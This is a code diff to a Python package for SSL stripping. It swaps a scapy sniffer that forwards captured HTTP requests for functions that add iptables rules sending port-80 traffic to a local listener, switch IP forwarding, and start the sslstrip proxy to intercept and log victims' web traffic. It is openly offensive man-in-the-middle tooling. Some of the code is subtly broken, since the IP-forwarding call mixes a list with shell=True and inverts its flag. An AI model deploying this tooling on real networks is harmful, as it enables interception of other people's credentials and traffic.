@@ -1,26 +1,44 @@
 '''This package contains everything related to SSL stripping'''
 
-from scapy.all import TCP, sniff
-import socket
+import subprocess
+from twisted.web import http
+from twisted.internet import reactor
 
-# Create a socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+from .sslstrip import *
 
-# Bind the socket to the local host and port 25518
-s.bind(('localhost', 25518))
+def setup_iptables_redirect(listen_port, reset=False):
+    try:
+        if reset:
+            # Run the iptables command to delete the redirection rule
+            subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", listen_port])
+        else:
+            # Run the iptables command to redirect traffic from port 80 to port 25518
+            subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", listen_port])
+    
+    except Exception as e:
+        print(f"An error occurred while trying to setup iptables: {e}")
 
-# Listen for incoming connections
-s.listen(1)
+def set_ip_forwarding(disable=False):
+    # Converting boolean to int makes it a 1 or 0. making it a string allows us to use it in the subprocess
+    value = str(int(disable))
 
-def packet_callback(packet):
-    if packet[TCP].payload:
-        data = str(packet[TCP].payload)
-        if 'GET' in data or 'POST' in data:
-            # Accept a connection
-            conn, addr = s.accept()
-            print(f"Connected by {addr}")
-            # Forward the data
-            conn.sendall(data.encode())
-            conn.close()
+    subprocess.run(["echo", value, ">", "/proc/sys/net/ipv4/ip_forward"], shell=True)
 
-sniff(filter='tcp port 80', prn=packet_callback, store=0)
+def start_ssl_strip(log_file, log_level, listen_port):
+    
+    gVersion = "adjusted 0.9"
+        
+    logging.basicConfig(level=log_level, format='%(asctime)s %(message)s',
+                        filename=log_file, filemode='w')
+
+    URLMonitor.getInstance().setFaviconSpoofing(False)
+    CookieCleaner.getInstance().setEnabled(False)
+
+    strippingFactory              = http.HTTPFactory(timeout=10)
+    strippingFactory.protocol     = StrippingProxy
+
+    reactor.listenTCP(int(listen_port), strippingFactory)
+                
+    print("\nsslstrip " + gVersion + " by Moxie Marlinspike running...")
+
+    reactor.run()
